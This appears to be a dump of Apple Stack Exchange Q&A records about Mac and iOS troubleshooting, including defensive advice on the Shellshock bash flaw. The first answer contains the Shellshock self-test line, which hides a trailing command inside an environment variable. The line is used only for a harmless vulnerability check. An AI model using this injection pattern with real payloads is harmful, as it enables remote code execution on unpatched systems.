combination security update today that includes the bash update as well!\n\nNote: Security Update 2014-005 includes the security content of OS X\n  bash Update 1.0\n\n\nA: Yes!\nType this in your shell\nenv x='() { :;}; echo vulnerable' bash -c 'echo hello'\n\nIf it says vulnerable then you are vulnerable.\nIf it says\nbash: warning: x: ignoring function definition attempt\nbash: error importing function definition for `x'\nhello\n\nthen you are good.\nEdit: link to the fix\n\nA: As an end user, check that:\n\n\n*\n\n*your guest account is off:\n\nSystem Preferences > Users & Groups > Guest User\n\n\n*your ssh access is off:\n\nSystem Preferences > Sharing > Remote Login\n\nBy default these are both off on Mavericks.\nAs an end user, it is safer to wait for an official Apple security update fixing this bash vulnerability.\n\nA: All Mac OS X machines are technically vulnerable to “Shellshock,” until Apple issues a security update that patches bash, but..  \nYour question should be: Can I be hacked remotely?  \nThere is so much software that uses bash absent-mindedly that answering that question is extremely hard. If you're worried then I'd suggest several changes in System Preferences to prevent remote exploits: \n\n\n*\n\n*Disable ALL sharing services under Sharing Preferences.  \n\n*Enable the Firewall under Security and Privacy. \n\n\nIf you're particularly worried then press the Firewall options button to :\n\n\n*\n\n*Uncheck Automatically allow signed software to receive incoming connections.\n\n*Check Block all incoming connections.\n\n\nThere is still a respectable chance that you're vulnerable to a level attack using DHCP, Bonjour, etc., but hey if you need another service then obviously you could leave it running while you hope it doesn't get exploited. And you'll need to leave the firewall more open too. It'll likely be fine if you're machine lives behind another firewall.\nAlso, are there local privilege escalation attacks enabled by “Shellshock?” Yes, almost surely. I wouldn't worry though because Mac OS X has enough similar attacks.  Apple doesn't patch local privilege escalation bugs quickly. And Apple creates them frequently with Apple Script enabled services. Just assume all Mac OS X machines are always vulnerable to local attacks. If you need to attend hacker conferences like DEFCON then buy yourself a Linux box for that purpose. \nUpdate: There are instructions for recompiling your own fixed bash and another questions covered doing so too. I'll do this myself, but IMHO that's overkill if you do not run any servers and keep Apple's firewall turned on anyways.\nUpdate: If you're comfortable with terminal usage, there is a program called execsnoop mentioned here that'll let you test whether bash is usually called by your server processes.  Ain't a magic bullet since the server process might call bash only in unusual situations, but it'll give you a good idea.\nFinally, Apple isn't very good about patching security vulnerabilities, but they're good at PR, so this'll get patched relatively fast.  It's therefore reasonable to think \"I don't need to run faster than the bear, I only need to run faster than the vast number of easily exploitable servers on the internet\".  :) \n\nA: I made this tool as soon as I heard about this vulnerability. It'll provide you with a link to a article to patch your shell if the tool determines you're vulnerable. \nRequires Mac OS X 10.6 and up.\n", "Q: Worn out (stripped) screws in Macbook Pro - how to remove? I was planning to remove my cdrom and add a second HD in my Macbook Pro (2011), but I can't remove the screws. It seems they are stripped, even though I've been really careful (they are really tight).\nSome images\nAnyone had a similar problem before? Which is the best way to remove them? Would Apple authorized places remove it?\n\nA: I would use locking pliers to take it off, then take the screw to a local fastenings store who should be able to sell you a similarly sized screw with exactly the same thread.\nYou may want to add Loctite, Apple usually uses Blue 242 Loctite on their screws. You can get cheaper brands, but make sure it's coloured blue — that's the strength of the glue.\n", "Q: New users can't see Apple applications from Utilities folder in Launchpad I felt like giving my mess of Launchpad icons a fresh start. So I did\ndefaults write com.apple.dock ResetLaunchPad -bool true && killall Dock\n\nOn checking Launchpad, it had appeared to have reset itself to default layout. Then to stop it resetting again on every reboot, I did\ncom.apple.dock ResetLaunchPad -bool false\n\nIt's always worked in the past but now I've discovered that no applications in /Applications/Utilities appear in Launchpad anymore. Terminal, Activity Monitor, AppleScript Editor and all the rest are missing:\n\nThe ones you see here actually reside in just /Applications. But Utilities are supposed to populate here amongst them.\nThe problem is persisting across users and also when I create new users.  I find that very odd in and of itself because I did not use sudo or otherwise elevate the commands I used to set the ResetLaunchpad flag.\nBasically, I don't want to have to drag the apps in /Applications/Utilities to the Launchpad icon and then manually organise them back into Launchpad's \"Other\" folder every time I create a new user.\nAny ideas how I might be able to get Launchpad to behave normally again? Thanks! I'm using OS X 10.9.5.\n\nA: I don't know if this is a related cause and the potential fix but I was able to get the issue resolved for me.\nI use Homebrew Cask and I have it setup to symlink the applications from my Homebrew Cask directory into my /Applications/ folder (the default is ~/Applications).\nThe solution for me was to remove all of the Symlinks (I just moved them to my desktop) and then I ran the terminal command:\ndefaults write com.apple.dock ResetLaunchPad -bool true; killall Dock\nAfter doing this my Utilities folder showed back up and when I moved the symlinks back into my Applications folder everything was back to normal.\nIf you do have symlinks in your /Applications/ directory or maybe even aliases it's probably worth giving this process a try.\nHope that helps.\n", "Q: Zsh using 100% of CPU during iWork install I've been trying to install Keynote and Numbers, but they hang like so:\n\nThis is associated with a shell script consuming 100% of a CPU:\n\nThat process is defaults delete com.apple.helpd com.apple.helpd.sdmMapsCreated, which looks like an operation that shouldn't be long-running at all:\n\nKilling its grandparent process results in the \"an error has occured\" message in the app store.

I would get the WHEEL spinning for over a minute for each click on anything.\nI looked for trouble shooting info and followed the procedures to use disk utility, etc. No issues with hardware were reported.\nI only had like 3 issues with registry entries I believe.\nI decided to backup my important files....took me 3 days because each click would take ages to be executed.\nNow for over 18 hours, I'm waiting on OS X Mavericks to finish installing on my computer which is under 2 yrs old. \nOh, after the initial stage of 'installation', the download and install, which took like 4 hrs, the computer rebooted (as was expected according to videos on yt).\nHowever instead of going to the setup page, it went back to installation window which was supposed to take 24 mins initially but I'm still waiting 4 hrs later.\nIs this common with Macs?\nIf not, what's the problem with this Mac and how can I fix this please?\nI get the long wheel spinning even during this reinstallation and I'm totally baffled by this.\nThanks for the help.\n\nA: This is not common.  I have never had this problem and I upgrade to every new version.\nI always create a bootable USB installer.  Here are the instructions from Apple: http://support.apple.com/kb/HT5856.  This will let you check your disk and reformat.  I always reformat so that I know everything is the way it is supposed to be, but it is a bit more time consuming.\n\nA: What is your installation source?  Are you installing via just the recovery partition?  If so, it's technically installing over the internet.  In other words, it's copying a ~5 GB installation via the internet.  If you put Mavericks on a thumb drive, then your only limitation is the speed of your USB bus.\nI'd suggest pulling down the installer on another Mac and creating a local installation source.  Installing it over the internet is a multi-hour process.\n\nA: I know it's been a while since the question has been asked, but this response is for the sake of anyone landing here through a google search or some such.\nThis is a known problem with the Apple Store for both iOS and Mac OS X. The solution is to change your DNS settings and flush your DNS cache. There seems to be something funny with apple's CDN.\nFor more details check out this reddit thread. To flush your DNS Cache (so that the settings change takes immediate effect) you need to run the following in a terminal (on OS X 10.9 or newer):\nsudo dscacheutil -flushcache \n\nor the following for OS X 10.8 or older:\nsudo killall -HUP mDNSResponder\n\n", "Q: Can I change the default trash sounds?

I recomend to make backup of those files before swap.\n", "Q: Saving applescripts as scripts versus text When saving a script in Applescript Editor, it defaults to the Script file format. The file produced is binary and cannot be indexed by Spotlight. So if I want to search a script based on a word used in the code, I cannot since script code is not indexed.\nOn the other hand I can save as text, but I must remember to change the format option every time!\nSo what is the advantage of saving in Script format and is it possible to make Text the default?\nI am using the editor in 10.6.8 Snow Leopard\nEDIT:\nText format files are saved with the extension .applescript and are setup to open by default with the Applescript Editor, same as with .scpt. \n\nA: This has been a goal for many an Applescripter for a long time.\nNot sure anyone has hit the holly grail without using a third party scripting app with a Spotlight indexer..\nI have tried a few things in the past but this thread prompted me again to have another go.\nI now normally try and save all my applescripts in one places, in a Scripts folder in my Documents folder and also use Hazel to watch place like my Documents folder and desktop for scpt files and move them into the Scripts folder.\nMy new idea is to run a shell script that will be passed a scpt file that is saved in my Normal scripts folder as a normal scpt file and use the shell command osadecompile to decompile and read the file. Then create a text version in my new Script Text folder.\nThe code I am using is:\nfname=`basename \"$1\"`\n\necho \"`osadecompile \"$1\"`\"  > \"/Users/UserName/Documents/Scripts/Script Text/$fname\".txt\n\nHazel conveniently uses $1 for the file path of the file being passed.\nAnd I use the command basename to get the file name.\nIn Hazel it looks like this.\n\nNotice I am using a date last modified condition with 5 minutes.\nThis is to try and catch any edits I do.\nThe nice thing I found is when I find the text file with the code I am looking for, I can either copy the text, refer to it, or find the scpt file easily because I have the same file name in the text file file name.\ni.e\ndisplay iTunes artwork.scpt\ndisplay iTunes artwork.scpt.txt\nThis idea should be able to be used with other folder watching apps or hopefully give you some inspiration ...\n\nA: I can think of two:\n\n\n*\n\n*Extension names are meant to be associated with your application of choice. If you change your applescripts to be the default .txt app, you will be either opening up plain text with AppleScript Editor, or opening up applescripts with TextEdit when you double click. Of course you can resort to context menu, but some may consider it an nuisance.\n\n\nTo take it further, an user can save all his files without any extension, and scroll through all his applications from Adobe Photoshop to VLC everytime, ad absurdum.\n\n\n*In less likely cases, an app needs the extension to know what to do with the file. For instance, TextMate can automatically apply the correct syntax highlight for .scpt files, and BetterTouchTool has an option to \"Open Application, File, Apple Script\". If the script is saved as .txt, it will be displayed rather than executed. \n\n\nThat's my 2 cents. Btw, if you cannot change the default save option, you can always create a macro with say Keyboard Maestro, and bind it to keyboard shortcut CMD+S. This way, the default save operation will be overridden by your custom sequence of actions that changes the file type.\n\nA: *\n\n*Manually create a blank file with the extension .applescript\n\n\n*Open the .applescript file. It will automatically  open with the Script Editor, and future saves will retain plain text format.\nCommand line example:\ntouch foo.applescript\nopen foo.applescript\n\n\nA: My own experience is that Script Editor will always do what I don't particularly want, which I have addressed by conceding the field.\nBut since I want spotlight access to at least some of my scripts, I created a script to save the current document as a text file in a storage folder I created that contains only these .applescript files.\ntell application \"Script Editor\"\n    set vPath to (path to documents folder) & \"as_stuffs:savedtexts:\" as text\n    \n    set d1 to document 1\n    set fN to name of d1        \n    save d1 as \"text\" in file (vPath & fN & \" _dmp.applescript\")\nend tell\n\nI access it from the script menu and it works reliably. The actual .scpt file gets filed manually according to its purpose or the app it works primarily with but all of the text files get saved in a single folder with an added '_dmp' in their filename so I can easily distinguish them. I also created a script that opens the folder (along with the .scpt folder and the 'user scripts' folder in the Library) although after a while I stopped using it.\nThis lets me not worry about saving scripts as .scpt but also get an appropriately named .applescript with no muss and no fuss.\n", "Q: Will this memory fit into my MacBook Pro?

So you can't do anything beside waiting and hoping, that apple will fix this issue in a future update.\n\nA: Also I have this problem in OS 10.10 Yosemite and it's continues to give me the inconvenience, so I googled till I find the answer. Finally, I'm trying to do this: make sure that the TC is not mounted (or dismount it). Then in finder menu use Go -> Connect to Server. Type AFP://TCnetworkname or IPaddress (replace with the real IP or real network name). When the computer finds the TC, you need to give a password (public for default) type in your password if you changed it or public if not, then save it in your keychain. That's it.\n", "Q: Accidentally removed all commands in terminal I was following a tutorial and put in the following line:\nexport PATH=\"~/.composer/vendor/bin/\"\n\nNow no commands work at all, not even things like ls.\nWhat does the command do that I copy and pasted in and how do I fix it?\n\nA: What you did\n$PATH is the variable that tells your shell (bash by default) where to look for your commands. It contains a list of directories, separated with colons (:). When you type ls, the shell will search all the directories listed within $PATH (/bin, /usr/bin, and so on) until it finds a file called ls, and will execute that.\nNormally, you set a variable simply with\nvariable=\"foo bar baz\"\n\n...however, that only sets that variable for the current shell -- those changes won't carry over to subshells, which can be important in (for example) scripts. Using\nexport variable=\"foo bar baz\"\n\n...will allow you to use the variable in subshells.\nSo, when you use export PATH=\"~/.composer/vendor/bin/\", you are overwriting the $PATH variable -- so when you try to use ls, the shell looks in ~/.composer/vendor/bin/, doesn't find any file named ls, and so fails. What you probably want to do is add ~/.composer/vendor/bin/ to your $PATH, which you can do with:\nexport PATH=\"$PATH:~/.composer/vendor/bin/\"\n\nYou can view the current contents of your $PATH with echo $PATH.\nHow to fix it\nAll of this only applies to the current shell (and all its subshells, since you used export), so you can fix the problem most simply by opening a new terminal, as Mateusz Szlosek's answer notes.\nIf you do want to alter your $PATH permanently, you can put that line at the end of your ~/.bashrc, which is sourced whenever you open an interactive shell. This is standard practice if you want to write a few of your own scripts (on Linux, we use ~/bin for user scripts, but they can go anywhere).\n\nA: export command works in the current session only. You can \"fix\" it by opening new Terminal window/tab.\n", "Q: Strange “Devices” section in iOS Wi-Fi Settings Has anyone ever seen this ‘Devices’ section in the Wi-Fi Settings page?\nIt very strange, it's my first time I've seen this.

If you can enter Time Machine, you may be able to restore your iPhoto library in ~/Pictures/iPhoto Library.\n\nA: This might be a bit too obvious, but if you have them on another device (such as an iPhone) you can import them again.\n", "Q: Finder quit unexpectedly I've got an issue where Finder quits at startup and then every 2-5 seconds after.\nProblem details and system config are as follows:\nProcess:         Finder [3103]\nPath:            /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\nIdentifier:      Finder\nVersion:         ???\nCode Type:       X86-64 (Native)\nParent Process:  launchd [184]\nResponsible:     Finder [3103]\nUser ID:         501\n\nDate/Time:       2014-09-25 13:12:30.718 +0100\nOS Version:      Mac OS X 10.9.5 (13F34)\nReport Version:  11\nAnonymous UUID:  D879BEB2-6DB1-8267-220C-B8ABDE8A8D18\n\n\nCrashed Thread:  0\n\nException Type:  EXC_CRASH (Code Signature Invalid)\nException Codes: 0x0000000000000000, 0x0000000000000000\n\nkernel messages:\n-0 sec              CODE SIGNING: cs_invalid_page(0x1000): p=3110[GoogleSoftwareUp] final status 0x0, allowing (remove VALID) page\n\nVM Regions Near 0x7fae4970ed70 (cr2):\n    VM_ALLOCATE            000000010dd77000-000000010dd78000 [    4K] rw-/rwx SM=ALI  \n--> \n    STACK GUARD            00007fff4e48b000-00007fff51c8b000 [ 56.0M] ---/rwx SM=NUL  stack guard for thread 0\n\nThread 0 Crashed:\n0   dyld                            0x00007fff603e4028 _dyld_start + 0\n\nThread 0 crashed with X86 Thread State (64-bit):\n  rax: 0x000000000000000d  rbx: 0x0000000000000000  rcx: 0x0000000000000000  rdx: 0x0000000000000000\n  rdi: 0x0000000000000000  rsi: 0x0000000000000000  rbp: 0x0000000000000000  rsp: 0x00007fff5248ad38\n   r8: 0x0000000000000000   r9: 0x0000000000000000  r10: 0x0000000000000000  r11: 0x0000000000000000\n  r12: 0x0000000000000000  r13: 0x0000000000000000  r14: 0x0000000000000000  r15: 0x0000000000000000\n  rip: 0x00007fff603e4028  rfl: 0x0000000000000201  cr2: 0x00007fae4970ed70\n\nLogical CPU:     0\nError Code:      0x020000f4\nTrap Number:     133\n\n\nBinary Images:\n    0x7fff603e3000 -     0x7fff60416817  dyld (???) <7AD43B9B-5CEA-3C7E-9836-A06909F9CA56> /usr/lib/dyld\n\nExternal Modification Summary:\n  Calls made by other processes targeting this process:\n    task_for_pid: 0\n    thread_create: 0\n    thread_set_state: 0\n  Calls made by this process:\n    task_for_pid: 0\n    thread_create: 0\n    thread_set_state: 0\n  Calls made by all processes on this machine:\n    task_for_pid: 189\n    thread_create: 0\n    thread_set_state: 0\n\nVM Region Summary:\nReadOnly portion of Libraries: Total=288K resident=228K(79%) swapped_out_or_unallocated=60K(21%)\nWritable regions: Total=8488K written=0K(0%) resident=12K(0%) swapped_out=0K(0%) unallocated=8476K(100%)\n\nREGION TYPE                      VIRTUAL\n===========                      =======\nSTACK GUARD                        56.0M\nStack                              8192K\nVM_ALLOCATE                           8K\nVM_ALLOCATE (reserved)               48K        reserved VM address space (unallocated)\n__DATA                              252K\n__LINKEDIT                           80K\n__TEXT                              208K\nmapped file                        6104K\nshared memory                         4K\n===========                      =======\nTOTAL                              70.5M\nTOTAL, minus reserved VM space     70.5M\n\n\nModel: MacBookPro10,1, BootROM MBP101.00EE.B02, 4 processors, Intel Core i7, 2.6 GHz, 8 GB, SMC 2.3f36\nGraphics: Intel HD Graphics 4000, Intel HD Graphics 4000, Built-In\nGraphics: NVIDIA GeForce GT 650M, NVIDIA GeForce GT 650M, PCIe, 1024 MB\nMemory Module: BANK 0/DIMM0, 4 GB, DDR3, 1600 MHz, 0x80AD, 0x484D54333531533642465238432D50422020\nMemory Module: BANK 1/DIMM0, 4 GB, DDR3, 1600 MHz, 0x80AD, 0x484D54333531533642465238432D50422020\nAirPort: spairport_wireless_card_type_airport_extreme (0x14E4, 0xEF), Broadcom BCM43xx 1.0 (5.106.98.100.22)\nBluetooth: Version 4.2.7f3 14616, 3 services, 23 devices, 1 incoming serial ports\nNetwork Service: Home VPN, PPP (PPTP)\nNetwork Service: Wi-Fi, AirPort, en0\nSerial ATA Device: APPLE SSD SD512E, 500.28 GB\nUSB Device: Hub\nUSB Device: FaceTime HD Camera (Built-in)\nUSB Device: Hub\nUSB Device: Keyboard Hub\nUSB Device: Apple Keyboard\nUSB Device: Hub\nUSB Device: BRCM20702 Hub\nUSB Device: Bluetooth USB Host Controller\nUSB Device: Apple Internal Keyboard / Trackpad\nThunderbolt Bus: MacBook Pro, Apple Inc., 23.4\n\nIs there anyway of fixing this?

I tried various suggestions including deleting Finder preferences and Sidebar preferences without success. However installing the 'Combo Update' for Sierra 10.12.4 from Terminal  using the instructions found at http://luo.ma/geek/terminal-combo worked for me. The only things I needed to change in the shell-script provided there were the Combo Update version link and also changed '-gt' to '-ge' so it would run when the version number was the same as that already installed.    \n\nA: Remove GoogleSoftwareUpdate!

I'm not entirely sure how I fixed it, but here was my process (forgive me for not having references to all the other threads I consulted readily available):\nI installed and ran Onyx, which indicated that I needed to repair my drive, which I did by booting with the Option key held down.  (Something like that.  The point is you need to run Disk Utility without booting from that drive, and I believe doing this causes you to boot into the recovery partition or something like that, but I'm a little fuzzy on the details.)  I both repaired the drive itself and the permissions.\nLater, I noticed that I had an unfinished update of Xcode 6.1, so I removed the half-downloaded new installation.  This briefly appeared to work, but soon Finder was back to spontaneously terminating every minute or so.\nI found that booting into Safe Mode caused the problem to go away (verified by opening the Activity Monitor, clicking on Finder, and checking to see if it would spontaneously terminate).  Following @awesomebing1's advice, I ran the Google Update Uninstaller, rebooted into regular mode; no joy.\n(I may have done one or two other things here, but I don't think they were critical.)\nI ran the Apple Hardware Test to check that it wasn't an issue with my third-party RAM or something along those lines.  (If you're not especially experienced with using the terminal, obtaining and installing AHT may be nontrivial; also, halfway decent Google-fu may be required to actually find the .dmg containing AHT.)  My computer passed.\nI thought maybe my updating bash to 4.3.27 could have had something to do with this, but Homebrew is (in my experience, at least) good about not breaking things.\nFlummoxed, I thought I'd need to wipe the disk, clone an old backup, and then migrate the new data onto 10.9.4 (I'm not entirely sure that this would work well).  Before trying that, I thought I'd have nothing to lose by running the 10.9.5 combo updater and then trying to update Xcode again.  Since doing those two things, everything appears to be running fine -- my current Finder process has be up for over an hour without terminating.\ntl;dr: Try the 10.9.5 combo updater.\n\nA: I would recommend upgrading to Yosemite. It sounds like your Finder application is in a state that it doesn't run - it could be a broken update or malware. As others pointed out Chrome and Google Software Update are unlikely the cause. To the best of my knowledge, Chrome does not interact with Finder. Google Software Update does, but only during self-updates, which on a normally running machine are quite rare. I am familiar with the Google Software Update code - it doesn't do anything special, just uses the session of the Finder to make sure that its own agent is started on that session. This is performed by executing an Apple utility in that session, not Google Software Update's code in the Finder context. If you are curious, you can learn more about OS X agents here: https://developer.apple.com/library/mac/technotes/tn2083.\nAdditionally, most of the Google Software Update code is open source. You can get the idea of what it does here: https://code.google.com/p/update-engine/\nIt is unfortunate that I cannot give you a better advice, but upgrading the machine is probably the safest bet of restoring the machine/Finder state.\n", "Q: Automator shell Script works, except inside dropbox I used Automator to create a service that runs pdf2svg from the context menu in Finder. \nfor f in \"$@\"\ndo\n    /opt/local/bin/pdf2svg $f ${f%.*}\".svg\"\ndone\n\nIt works fine, except it does not work on files stored in my dropbox folders.\nHow can I fix this?\n\nA: If any of your files or folders in Dropbox happen to have spaces, your script will not behave as you expect.  You can fix that by adding quotes to the appropriate places like so:\nfor f in \"$@\"\ndo\n    /opt/local/bin/pdf2svg \"$f\" \"${f%.*}.svg\"\ndone\n\nIf that isn't the source of the problem, please update your question with more specifics as to what the behavior is that you see when you run this script manually from the command line.\n", "Q: Can I use my brothers old SIM card that's in an iPad he gave me? My brother just gave me his old iPad after purchasing a new one. He accidently  left his SIM card in there because he got a different SIM card for his new one. I won't be able to add to my current carrier plan for another month or so, but when I turned on and activated the iPad in order to get to home screen, my wi-fi picked up and asked for my password. It is now working wth my wi-fi with no problems. I turned the carrier settings off, because I know the SIM card is still activated thru his account. My question is by only using wi-fi with his old SIM card, and leaving carrier data off, (until I transfer on my account) is there any chance at all he would be charged or notified it was being used, etc.? \n\nA: If you leave the carrier OFF the card should actually not be charged. At least that's usually the recommendation when using an iPad abroad. As far as I know you could actually even remove the SIM card and still use the iPad over wifi – and maybe that would be the best option if you want to be 100% sure your brother's account is not charged.\n", "Q: Camera Roll vs Photos App, what name is correct? What is the name of the default native App that stores all photos and pictures on an iOS device? Since iOS 8 it seem to be called \"Photos\" were before Apple used to call it Camera Roll. Or do I mix something here?\n\nUpdate: what is the correct terminology for the default Photos App and for what reasons should the term \"Camera Roll\" be used?\n\nA: The app has been Photos since the original iPhone OS release, although there has been an album named \"Camera Roll\" as long as I can remember (iPhone OS 2.0 was my first). See http://cdn.shopify.com/s/files/1/0163/8048/files/iOS-Evolutionjpg.jpg?1903\n\nUpdate: The app can be called Photos or Photos.app or Photos on iOS. Apple seems to just call it Photos, though. The Camera roll refers to the default album within Photos. Photographs taken from your camera default to that album—it's the \"roll\" of images captured by your phone. If you sync photos from another device, they'll be in Photos, but not on the Camera Roll (they'll have their own album(s)). If you have other apps that interact with your photos on-device, they may read from the Camera Roll or may interact with other albums.\n2nd Update: Having now updated to iOS 8, I now realize that \"Camera Roll\" has been re-termed \"Recently Added\" in Photos. This is a better description of what it is, since not all of its entries get there via camera. For example, a photo saved from Facebook's app will on iOS 7 and earlier appear in the \"Camera Roll\" even though it's not a photo from the camera. \n\nA: Your updated question is really a matter of opinion with no \"correct\" answer.  The app is \"Photos\" and the area that used to be referred to as the \"Camera Roll\" is now called \"Photos.\" (see the answer from @samh), except that it ALSO contains photos from your other iDevices.  \nBeyond that, there is no longer a definitive \"Camera Roll\" in iOS 8, so any usage of it is informal and non-definitive.\n", "Q: How to enable cut action (and shortcut)? I am using currently Mac OSX v. 10.9.5 and not being able to cut files or folders is the most stupid thing I have seen in an Operating System, with all respect for this nice OS. \nIs there a possibility to enable this shortcut or action?\n\nA: Things are \"Different\" on Mac.

The 2 apps couldn't possibly be used as a replacement for each other.\nApple's concern here is keeping out over-served functionality.  There are so many \"fart\" apps that yet-another-one can't possibly help any user anywhere beyond what's already available.

Now the battery doesn't work. If I leave the battery in the laptop while plugged in, it gets very hot as if it is trying to charge but won't. So, to be safe I am running the computer with the battery pulled. Anyone know any ways to revive the new dead battery, or am I stuck buying a new one again? \n\nA: If a lithium ion battery is drained and left to sit for an extended period of time uncharged, it can go into a \"sleep\" state that does not enable a recharge by standard charging methods. \nI found this info at http://batteryuniversity.com/learn/article/charging_lithium_ion_batteries\n\"Li-ion should never be discharged too low, and there are several safeguards to prevent this from happening. The equipment cuts off when the battery discharges to about 3.0V/cell, stopping the current flow. If the discharge continues to about 2.70V/cell or lower, the battery’s protection circuit puts the battery into a sleep mode. This renders the pack unserviceable and a recharge with most chargers is not possible. To prevent a battery from falling asleep, apply a partial charge before a long storage period.\"\n\nA: That shouldn't happen at all. I think the battery itself has a defect. Because the battery wasn't charged before you got it, for a much longer time than two weeks. Because, the seller has, obviously, stored the battery himself for a long time.\nI would recommend to return the battery immediately. Otherwise you risk damage to your laptop.\n", "Q: My MacBook Air is automatically connecting to a password protected network that's not mine! I'm starting to think I've been hacked because my Macbook Air is frequently jumping to a neighbors password protected network on its own!\nI see the network in the \"preferred network\" list and I don't know how it got there!  I also don't know what that network's password is but my macbook does!  To make matters worse I've also seen my iPhone on the same network!  Anyone have any ideas as to what's going on?\n\nA: Wi-Fi passwords are synchronized via iCloud keychain. That's why your iPhone also knows the password. Try deleting this network from Preferred Networks.\nAlso delete item from your keychain.\nIn Keychain Access.app select iCloud keychain, find the item with the SSID (network name) of your neighbor's network and remove it (Right click -> Remove). \n", "Q: Transfer music to iPod touch with iTunes without disrupting existing music I have a specific album on my Apple Mac in iTunes that needs to be copied to my iPod Touch. I have music on my iPod touch that was from another device (old PC), so I cannot sync the entire music library on iTunes (Apple Mac), as it does not have some of the music I have stored on my iPod, and will erase it.\nIf I manually select the album I need to transfer from iTunes to iPod, will that then erase everything on my iPod and replace it with the one synced album? Or will it just add the one album I need to my iPod, and leave all the other music on the iPod intact?\n\nA: You can't add new music to your iPod if you haven't synced your iPod with your iTunes before and yes, all your music would be deleted from your iPod and be replaced with the iTunes-library.\nBut what you can do is, you can use a software to copy all your music etc. to your Mac and than you can sync it with this Apple Mac. I used iMazing(formerly DiskAid) many times and it works great. Yes, it costs something, but it is worth the price and an awesome tool.\nSo:\n\n*\n\n*Download iMazing or any other tool that allows you to transfer your iPod content to the mac without iTunes.\n\n*Sync your iPod with the iTunes which has this specific album you want.\n\n*Now all your music will be replaced with the iTunes library. But because you've copied your songs from the iPod to your mac/iTunes library before(Step 1) it will sync all your music back to your iPod.\n\nThat's it.\n\nA: TouchCopy is a another good option for this, it's one of those programs I only need once in a while, but when I do need it, I find it invaluable.  TouchCopy will show you music that’s on your iPod and not on your computer. Simply select that music and copy it to your iTunes. Then resync your  iPod to  iTunes. Pretty simple really!\n", "Q: What could be the reason for dock icons to have disappeared? So this has happened to me again, my icons from desktop and the icons on dock and launchpad have been disappeared. I'm guessing that the icon builder daemon has crashed. \nWhat should i do to get back all the icons to back where it was?\n\n\nA: That is a strange behavior which happens to many users. One way to fix that is to open a terminal and use the killall-command.\nBecause the launchpad is connected with the dock, you can just use the following command to get your icons back:\nkillall Dock\n\nThat should fix your dock and launchpad-problem. But I don't know if it will help for the missing Desktop-icons.\n", "Q: iTunes locks up (library on NAS) iTunes continually locks up on me.  I have my library set to an external NAS, and I only launch iTunes when connected to this NAS.  Any ideas why iTunes locks up - is it related to the library not being on my PC?\n\nA: Your assumption that it locks up because the iTunes library is located on the NAS is likely correct. Some NAS's offer a setting/app to run an iTunes-Server. If your NAS offers something like that you should use that instead of just putting the library on a shared drive. (E.g. http://qnap.com/en/index.php?lang=en&sn=2674)\nIf your NAS doesn't have iTunes Server functionality you could try going through the NAS settings and see if there are power-saving options like \"spinning down the harddrive\" that you can disable. By disabling those settings the NAS will remain active all the time and there will be less of a delay when iTunes tries get the next track etc.\nIf you need more help you should post the exact model of your NAS and people may be able to tell you something more specific.\n", "Q: How to mitigate Bash risk while waiting for a patch (sans a recompile)?

According to this site, there are three models of iPhone 6: A1549(GSM), A1549(CDMA), and A1586. It says the A1549(CDMA) model \"supports all the same spectrum\" as its GSM counterpart, but also supports additional spectrum making it a \"world phone\". Does this mean the unlocked T-Mobile iPhone 6 is essentially the Verizon model with its CDMA capabilities disabled? Could one go to an Apple Store, pay for a Verizon iPhone 6 in full, and pop in a T-Mobile SIM with no side effects?\n\nA: \nThe GSM side of Verizon phones are unlocked and will work on domestic\n  carriers but there is no guarantee all features will work. It is not\n  the same for Sprint, the GSM side of that phone is unlocked and\n  unlocking it will only allow it to work with non-domestic GSM\n  carriers.\n\nA1549 (CDMA): \n\nThis is considered as the world phone version. It supports all the\n  same spectrum frequencies as the A1549 (GSM) and also includes CDMA\n  EV-DO Rev. A and Rev. B (with 800, 1700/2100, 1900 and 2100 MHz\n  bands). Besides, it works on UMTS/HSPA+/DC-HSDPA (850, 900, 1700/2100,\n  1900, 2100 MHz), GSM/EDGE (850, 900, 1800, 1900 MHz) and 4G LTE bands\n  include bands 1, 2, 3, 4, 5, 7, 8, 13, 17, 18, 19, 20, 25, 26, 28, 29.\n  The model is compatible with Verizon and Cricket in the US. However,\n  if you buy an unlocked Verizon phone, you will be able to use it on\n  any other GSM networks like T-Mobile and AT&T as well.\n\nBest is to double check with T-Mobile.\n\nA: Apple published detailed pages about both iPad LTE Support and iPhone LTE Support. These pages have a breakdown on device model versus carrier coverage for current (iPhone 6 and 6 Plus, iPad Air 2 and iPad Mini 3) and old devices.\nFrom this table you can see carrier support per device number.\nGroup 1 (USA):\n\niPhone 6 Model A1549 (GSM) and Model A1549 (CDMA)\niPhone 6 Plus Model A1522 (GSM) and Model A1522 (CDMA)\nAio, Alaska Communications, AT&T, Consumer Cellular, Cricket, Family\n  Mobile, GCI, Net 10, Straight Talk, T-Mobile, Union Wireless, Verizon\n\nGroup 2 (USA):\n\niPhone 6 Model A1586 (GSM) and  Model A1586 (CDMA)\niPhone 6 Plus Model A1524 (GSM) and Model A1524 (CDMA)\nAppalachian Wireless, Bluegrass\n  Cellular, C Spire, Cellcom, Chariton Valley, Chat Mobility, Defense\n  Mobile, MobileNation, Nex-Tech, NorthwestCell, nTelos, Pioneer\n  Cellular, Sprint, STRATA Networks, Syringa, Thumb Cellular, United\n  Wireless, US Cellular\n\nI find awkward that iPhone 6 on the second group has the same list of LTE bands as the iPad Air 2 listing, but the list of international carriers is shorter. This can be caused by either iPad LTE page being more up to date, or because this is actually dependent on carrier configuration and contracts with Apple.\n\nA: You only run into trouble if you wanna activate your iPhone with Sprint or any of their MVNOs and don't have a Sprint-compatible iPhone, otherwise you're fine. Well, most of the time. Verizon and its MVNOs are CDMA carriers. AT&T, T-Mobile and their respective MVNOs are GSM carriers. The odd ball is Sprint in only this aspect: their phones don't work interchangeably with Verizon, even though they both use CDMA cellular technology. And up to at least the iPhone 5s (and maybe even the 6 and 6s) their iPhones don't work either with U.S. GSM carriers either, even though they DO have the GSM bands. I heard that the GSM part of the phone ONLY works internationally (in a foreign country) if Sprint unlocks the GSM part of the phone \"at their discretion.\"\n\nA: I got too carried away with complaining about the 5s and older models about their lack of compatibility/exchangeability between carriers.\nOk, as far as I know when it comes to the 6, if you buy a Verizon phone (or some other phone for that matter) these days it will work with both Verizon and any GSM carrier worldwide. This is due that Verizon phones have come with GSM cellular bands too on all their phones for about since LTE appeared. And, more importantly, those bands are unlocked, meaning that they can be used with any carrier worldwide. This is due to Verizon coming into an agreement with the FCC to have their phones unlocked in exchange for spectrum in LTE bands, or something like that. I wish that the FCC would had done the same with Sprint. So, yes, a Verizon iPhone 6 will work with T-mobile and any other GSM carrier worldwide that accepts bring-your-own-phone. These days pretty much all carriers worldwide accept 